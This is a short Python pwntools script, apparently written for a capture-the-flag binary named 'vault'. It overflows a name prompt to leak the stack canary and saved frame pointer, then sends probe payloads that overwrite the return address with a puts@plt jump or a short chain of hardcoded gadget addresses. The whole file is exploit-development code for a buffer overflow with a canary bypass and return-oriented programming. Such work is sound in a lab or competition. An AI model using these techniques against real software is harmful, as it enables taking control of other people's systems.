from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def round_leak(io, prompt=b'Enter your name: '):
    io.recvuntil(prompt)
    io.send(b'A' * 73)
    io.recvuntil(b'Hello, ' + b'A' * 73)
    leak = io.recvuntil(b'\nLeave a message', drop=True)
    canary = b'\x00' + leak[:7]
    rbp = (leak[7:13] + b'\x00' * 8)[:8]
    io.recvuntil(b'vault keeper: ')
    return canary, rbp, leak

def probe_local(kind):
    io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './vault'])
    canary, rbp, leak = round_leak(io)
    if kind == 'plt':           # single jump to puts@plt, rdi intact?
        payload = b'A' * 72 + canary + rbp + p64(0x401030)
    elif kind == 'plt_rdi':     # same but see raw output
        payload = b'A' * 72 + canary + rbp + p64(0x401030)
    elif kind == 'popprobe':    # POP,DUMMY,LOOP -> prompt again?
        payload = b'A' * 72 + canary + rbp + p64(0x401205) + p64(0x4013c9) + p64(0x401301)
    io.send(payload)
    try:
        d = io.recv(timeout=3)
    except Exception:
        d = b''
    print(f'{kind}: {d!r}')
    io.close()

probe_local(sys.argv[1])
